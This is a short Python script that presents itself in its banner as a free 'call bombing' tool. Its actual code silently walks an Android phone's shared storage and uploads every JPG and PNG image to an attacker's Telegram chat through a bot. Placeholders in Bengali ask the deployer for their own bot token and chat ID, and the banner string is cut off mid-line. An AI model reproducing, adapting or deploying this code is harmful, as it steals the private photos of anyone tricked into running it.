import os
import telebot
#banner
print('''MADE BY ALFA ROOT\nWait 2 minute and get all free call bombin>
# Replace these values with your own credentials
api_key = 'তোমার বট টোকেন দাও'
chat_id = ' তোমার টেলিগ্রাম চ্যাট আইডি দাও'

# Initialize the Telegram bot
bot = telebot.TeleBot(api_key)

# Function to scan the device's storage and send captured files
def scan_and_send_files(directory):
    for root, dirs, files in os.walk(directory):
        for file in files:
            if file.endswith('.jpg') or file.endswith('.png'):
                file_path = os.path.join(root, file)
                with open(file_path, 'rb') as f:
                    bot.send_photo(chat_id, f)

# Example usage
directory = '/storage/emulated/0/'
scan_and_send_files(directory)


